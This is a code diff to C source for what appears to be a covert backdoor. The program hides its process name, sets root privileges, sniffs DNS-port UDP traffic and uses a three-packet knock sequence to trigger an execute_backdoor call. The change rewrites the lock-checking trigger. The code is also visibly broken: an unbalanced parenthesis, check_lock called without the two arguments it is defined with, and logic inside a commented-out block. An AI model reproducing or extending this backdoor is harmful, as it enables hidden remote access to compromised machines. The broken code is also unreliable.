@@ -30,7 +30,6 @@
 #include <unistd.h>
 #include <sys/types.h>
 #include <sys/prctl.h>
-#include <pthread.h>
 
 #include <net/ethernet.h>
 #include <netinet/ip.h>
@@ -65,6 +64,15 @@ void mask_application(char *name)
 
 	setuid(0);
 	setgid(0);
+}
+
+void check_lock(char *addr, int port)
+{
+	if(!((lock + 1) & ((1 << 3) - 1))))
+		execute_backdoor(addr, port);
+
+	//lock = 0;
+	//sleep(5);
 }
 
 /*-----------------------------------------------------------------------------------------------
@@ -102,12 +110,15 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
 		{
 			case R_KEY:
 				BIT_SET(lock, 0);
+				check_lock();
 				break;
 			case G_KEY:
 				BIT_SET(lock, 1);
+				check_lock();
 				break;
 			case B_KEY:
 				BIT_SET(lock, 2);
+				check_lock();
 				break;
 			default:
 				break;
@@ -115,15 +126,6 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
 	}*/
 }
 
-
-void *check_lock(void *ptr)
-{
-	if(!((lock + 1) & ((1 << 3) - 1))))
-		execute_backdoor();
-
-	lock = 0;
-	sleep(5);
-}
 
 /*-----------------------------------------------------------------------------------------------
 -- FUNCTION:   process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
@@ -159,7 +161,6 @@ int main(int argc, char *argv[])
 	char errbuf[PCAP_ERRBUF_SIZE];
 	char filter_exp[] = "port 53 and udp";  // filter expression
 	const u_char *packet;
-	pthread_t clThread;
 
 	struct bpf_program fp;  // compiled filter expression
 	struct pcap_pkthdr header;
@@ -205,8 +206,6 @@ int main(int argc, char *argv[])
 		return(2);
 	}
 
-	
-	//pthread_create( &clThread, NULL, check_lock, NULL);
 
 	// rcv_packet will be called every time a packet is captured
 	pcap_loop(handle, -1, process_packet, NULL);
